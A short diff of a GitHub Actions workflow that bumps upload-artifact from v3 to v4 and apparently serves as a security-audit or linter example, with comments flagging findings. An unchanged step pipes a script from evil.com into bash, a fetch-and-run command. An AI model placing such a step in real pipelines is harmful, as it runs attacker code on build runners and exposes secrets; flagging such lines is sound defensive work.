@@ -6,4 +6,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: curl https://evil.com/install.sh | bash   # critical
-      - uses: actions/upload-artifact@v3               # unpinned
+      - uses: actions/upload-artifact@v4               # unpinned
